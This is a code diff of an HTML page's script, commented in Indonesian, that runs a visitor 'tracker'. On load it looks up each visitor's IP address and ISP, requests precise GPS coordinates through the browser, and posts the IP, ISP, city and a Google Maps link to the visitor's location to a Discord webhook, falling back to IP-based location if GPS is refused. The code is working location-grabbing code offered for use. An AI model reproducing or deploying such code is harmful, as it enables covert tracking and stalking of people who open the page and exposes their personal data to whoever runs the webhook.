@@ -55,45 +55,64 @@
 
         // Ambil Data Pengunjung & Kirim ke Discord
         async function trackVisitor() {
-            try {
-                const res = await fetch("https://ipapi.co/json/");
-                const data = await res.json();
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
 
-                document.getElementById('status').innerText = "Visitor Detected!";
-                document.getElementById('ip').innerText = "IP Address: " + data.ip;
-                document.getElementById('location').innerText = "Location: " + data.city + ", " + data.country_name;
+        // Tampilkan info di web (tetap seperti kode lamamu)
+        document.getElementById('status').innerText = "Visitor Detected!";
+        document.getElementById('ip').innerText = "IP Address: " + data.ip;
+        document.getElementById('location').innerText = "Location: " + data.city + ", " + data.country_name;
 
-                // Tampilkan Map di Web
-                const map = L.map('map').setView([data.latitude, data.longitude], 13);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                L.marker([data.latitude, data.longitude]).addTo(map).bindPopup("You are here").openPopup();
+        // Minta GPS Akurat
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                // Update map di web jika ada
+                if(typeof L !== 'undefined') {
+                    const map = L.map('map').setView([lat, lon], 13);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                    L.marker([lat, lon]).addTo(map).bindPopup("You are here").openPopup();
+                }
 
-                // Kirim Pesan ke Discord
-                const pesan = {
-                    username: "BASAKENCANA TRACKER",
-                    embeds: [{
-                        title: "🚨 PENGUNJUNG BARU TERDETEKSI!",
-                        color: 5763719,
-                        fields: [
-                            { name: "🌐 IP Address", value: `**${data.ip}**`, inline: true },
-                            { name: "🏢 ISP", value: data.org, inline: true },
-                            { name: "📍 Lokasi", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: false },
-                            { name: "🗺️ Google Maps", value: `[KLIK UNTUK LIHAT LOKASI](https://www.google.com/maps?q=${data.latitude},${data.longitude})`, inline: false },
-                        ],
-                        timestamp: new Date()
-                    }]
-                };
-
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(pesan)
-                });
-
-            } catch (err) {
-                console.log("Error:", err);
-            }
+                await sendToDiscord(data, mapsLink, "🎯 AKURAT (GPS)");
+            }, async (error) => {
+                // Jika GPS ditolak, pakai lokasi IP
+                const ipMaps = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+                await sendToDiscord(data, ipMaps, "☁️ ESTIMASI (IP)");
+            });
         }
+    } catch (err) {
+        console.log("Error:", err);
+    }
+}
+
+async function sendToDiscord(data, mapsLink, metode) {
+    const pesan = {
+        username: "BASAKENCANA TRACKER",
+        embeds: [{
+            title: "🚨 PENGUNJUNG BARU TERDETEKSI!",
+            color: 16711680, // Warna Merah
+            fields: [
+                { name: "🌐 IP Address", value: `**${data.ip}**`, inline: true },
+                { name: "📡 ISP", value: data.org, inline: true },
+                { name: "📍 Lokasi", value: `${data.city}, ${data.region}`, inline: false },
+                { name: "🎯 Metode", value: metode, inline: true },
+                { name: "🗺️ Google Maps", value: `[KLIK UNTUK LIHAT LOKASI](${mapsLink})`, inline: false }
+            ],
+            timestamp: new Date()
+        }]
+    };
+
+    await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(pesan)
+    });
+}
         trackVisitor();
     </script>
 </body>
